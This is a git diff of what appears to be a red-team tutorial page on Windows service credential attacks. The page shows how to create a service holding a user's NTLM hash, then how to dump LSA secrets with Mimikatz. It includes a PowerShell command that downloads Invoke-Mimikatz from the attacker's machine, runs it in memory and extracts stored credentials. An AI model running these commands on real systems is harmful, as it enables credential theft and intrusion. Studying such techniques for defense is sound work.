@@ -17,7 +17,7 @@ description: >-
 
 We've created the user account _noah._
 
-1. Login with an Administrator account into the machine, where you want to configure the service. In our example we will configure this within WS01.
+1. Login with an `Administrator` account into the machine, where you want to configure the service. In our example we will configure this within `WS01`.
 2. Open up _cmd.exe_
 3. We're going to execute the command:
 
@@ -25,7 +25,7 @@ We've created the user account _noah._
 sc create <name> binPath="C:\nonexisting.exe" obj="<username>@<domain>" password="<plaintext password or NTLM hash of the user>"
 ```
 
-The password of the service can be fake. So to make our attack a bit more fun, we're going to place the NTLM hash of our user Noah. This will enable us to make it a 'pass-the-hash' attack.
+The password of the service can be fake. So to make our attack a bit more fun, we're going to place the NTLM hash of the user `Noah`. This will enable us to make it a 'pass-the-hash' attack.
 
 In our example we're going to execute the following command:
 
@@ -43,22 +43,21 @@ When executed, we will get a success message.
 
 ### Tools
 
-[https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
+* [MimiKatz ](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
 
 ### Executing the attack
 
 For this attack we need a high priviliged user.
 
 1. Start PowerShell as an Administrator.
-2. Execute MimiKatz. This can be done in many ways. In our example we will be hosting Invoke-mimikatz.ps1 on our attacker machine.\
-   \
-   The command we will be running within our PowerShell session is:
+2. Execute MimiKatz. This can be done in many ways. In our example we will be hosting Invoke-mimikatz.ps1 on our attacker machine. Download mimikatz into memory using the following command and then execute MimiKatz:
 
 ```
-IEX (New-Object System.Net.Webclient).DownloadString('http://<ip>/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
+IEX (New-Object System.Net.Webclient).DownloadString('http://<ip>/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
 ```
 
-The result is that our freshly created service is shown, including with username and password
+The result is that our freshly created service is shown, including with username and NTLM Hash:
 
 ![](../../../.gitbook/assets/image.png)
 
